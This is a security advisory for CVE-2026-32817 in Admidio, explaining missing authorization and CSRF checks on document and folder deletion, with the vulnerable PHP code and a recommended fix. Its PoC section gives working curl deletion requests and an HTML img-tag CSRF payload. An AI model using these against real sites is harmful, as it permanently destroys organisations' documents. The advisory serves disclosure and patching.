# [C] Admidio is Missing Authorization and CSRF Protection on Document and Folder Deletion

## Summary
Severity: Critical
Advisory: GHSA-rmpj-3x5m-9m5f
CVE: CVE-2026-32817
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-rmpj-3x5m-9m5f
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=5.0.0 <5.0.7

## Details
## Summary

The documents and files module in Admidio does not verify whether the current user has permission to delete folders or files. The `folder_delete` and `file_delete` action handlers in `modules/documents-files.php` only perform a VIEW authorization check (`getFolderForDownload` / `getFileForDownload`) before calling `delete()`, and they never validate a CSRF token. Because the target UUIDs are read from `$_GET`, deletion can be triggered by a plain HTTP GET request. When the module is in public mode (`documents_files_module_enabled = 1`) and a folder is marked public (`fol_public = true`), an unauthenticated attacker can permanently destroy the entire document library. Even when the module requires login, any user with view-only access can delete content they are only permitted to read.

## Details

### Module Access Check

File: `D:/bugcrowd/admidio/repo/modules/documents-files.php`, lines 72-76

The module only blocks unauthenticated access when the setting is 2 (members-only). When the setting is 1 (public), no login is required to reach any action handler:

```php
if ($gSettingsManager->getInt('documents_files_module_enabled') === 0) {
    throw new Exception('SYS_MODULE_DISABLED');
} elseif ($gSettingsManager->getInt('documents_files_module_enabled') === 2 && !$gValidLogin) {
    throw new Exception('SYS_NO_RIGHTS');
}
```

### Vulnerable Code Path 1: Folder Deletion

File: `D:/bugcrowd/admidio/repo/modules/documents-files.php`, lines 122-133

```php
case 'folder_delete':
    if ($getFolderUUID === '') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    } else {
        $folder = new Folder($gDb);
        $folder->getFolderForDownload($getFolderUUID);  // VIEW check only

        $folder->delete();                               // no CSRF token, no upload/admin check
        echo json_encode(array('status' => 'success'));
    }
    break;
```

The target UUID is read exclusively from `$_GET` at line 64:

```php
$getFolderUUID = admFuncVariableIsValid($_GET, 'folder_uuid', 'uuid', ...);
```

### Vulnerable Code Path 2: File Deletion

File: `D:/bugcrowd/admidio/repo/modules/documents-files.php`, lines 150-161

```php
case 'file_delete':
    if ($getFileUUID === '') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    } else {
        $file = new File($gDb);
        $file->getFileForDownload($getFileUUID);  // VIEW check only

        $file->delete();                           // no CSRF token, no upload/admin check
        echo json_encode(array('status' => 'success'));
    }
    break;
```

Same pattern as `folder_delete`. The file UUID is also read from `$_GET` (line 69).

### getFolderForDownload Grants VIEW Access to Public Folders Without Login

File: `D:/bugcrowd/admidio/repo/src/Documents/Entity/Folder.php`, lines 432-438

```php
// If the folder is public (and the file is not locked) => allow
if ($this->getValue('fol_public') && !$this->getValue('fol_locked')) {
    return true;
}
```

This is the correct check for granting VIEW access to public folders. It is not an appropriate gate for a destructive delete operation.

### Contrast with Other Write Operations (Properly Protected)

All other write operations in `documents-files.php` route through `DocumentsService`, which validates the CSRF token via `getFormObject($_POST['adm_csrf_token'])` before any mutation (DocumentsService.php lines 278, 332, 386, 448). The delete cases bypass this service entirely and receive no equivalent protection.

### Folder::delete() Is Recursive and Permanent

File: `D:/bugcrowd/admidio/repo/src/Documents/Entity/Folder.php`, lines 213-259

`Folder::delete()` recursively removes all sub-folders and files from both the database and the physical filesystem. There is no soft-delete or trash mechanism. A single call to `folder_delete` on the root folder permanently destroys the entire document library.

### UI Shows Delete Buttons Only to Authorized Users (Not Enforced Server-Side)

File: `D:/bugcrowd/admidio/repo/src/UI/Presenter/DocumentsPresenter.php`, lines 546, 589

The presenter renders delete action links only when the user has upload rights (`hasUploadRight()`). This client-side restriction is not enforced server-side. Any HTTP client can send the GET request directly.

## PoC

**Scenario 1: Unauthenticated deletion of a public folder (zero credentials required)**

Prerequisites: `documents_files_module_enabled = 1`, target folder has `fol_public = true`.

Step 1: Discover folder UUIDs by fetching the public document list (no login needed):

```
curl "https://TARGET/adm_program/modules/documents-files.php?mode=list"
```

Step 2: Delete the entire folder tree permanently:

```
curl "https://TARGET/adm_program/modules/documents-files.php?mode=folder_delete&folder_uuid=<FOLDER_UUID>"
```

Expected response: `{"status":"success"}`

The folder, all its sub-folders, and all their files are permanently removed from the database and filesystem. No authentication or token is required.

**Scenario 2: Authenticated view-only member deletes any accessible file**

Prerequisites: `documents_files_module_enabled = 2` (members-only). Attacker has a regular member account with view rights to the target folder but no upload rights.

```
curl "https://TARGET/adm_program/modules/documents-files.php?mode=file_delete&file_uuid=<FILE_UUID>" \
  -H "Cookie: ADMIDIO_SESSION_ID=<view_only_session>"
```

Expected response: `{"status":"success"}`

**Scenario 3: Cross-site GET CSRF via image tag**

Because deletion uses a plain GET request with no token, an attacker can embed the following in any HTML email or web page. When a logged-in Admidio member views the page, their browser fetches the URL with the session cookie attached:

```html
<img src="https://TARGET/adm_program/modules/documents-files.php?mode=folder_delete&folder_uuid=<UUID>" width="1" height="1">
```

## Impact

- **Unauthenticated Data Destruction:** When the module is in public mode and any folder is marked public, an unauthenticated remote attacker can permanently delete any or all documents and folders. No credentials or tokens are required.
- **Privilege Escalation (View to Delete):** Any logged-in member with view-only access can delete content they are only permitted to read, bypassing the `hasUploadRight()` permission boundary.
- **Cross-Site CSRF:** Because UUIDs appear in page URLs visible to authenticated users, an attacker can embed a GET-based CSRF payload in phishing content to trigger deletion on behalf of any victim.
- **No Recovery Path:** `Folder::delete()` and `File::delete()` are permanent operations. The only recovery is from a database and filesystem backup.
- **Full Organizational Impact:** Deletion of the root documents folder recursively removes the entire document library of the organization.

## Recommended Fix

### Fix 1: Add authorization check and CSRF token validation to both delete handlers

```php
case 'folder_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    if ($getFolderUUID === '') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    }
    $folder = new Folder($gDb);
    $folder->getFolderForDownload($getFolderUUID);
    if (!$gCurrentUser->isAdministratorDocumentsFiles() && !$folder->hasUploadRight()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
    $folder->delete();
    echo json_encode(array('status' => 'success'));
    break;

case 'file_delete':
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);
    if ($getFileUUID === '') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    }
    $file = new File($gDb);
    $file->getFileForDownload($getFileUUID);
    $parentFolder = new Folder($gDb);
    $parentFolder->readDataById((int)$file->getValue('fil_fol_id'));
    if (!$gCurrentUser->isAdministratorDocumentsFiles() && !$parentFolder->hasUploadRight()) {
        throw new Exception('SYS_NO_RIGHTS');
    }
    $file->delete();
    echo json_encode(array('status' => 'success'));
    break;
```

### Fix 2: Move folder_uuid and file_uuid to POST parameters for delete operations

Reading the UUID from `$_GET` enables GET-based CSRF. Moving to `$_POST` and validating the CSRF token together closes both issues simultaneously.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f
- https://nvd.nist.gov/vuln/detail/CVE-2026-32817
- https://github.com/Admidio/admidio
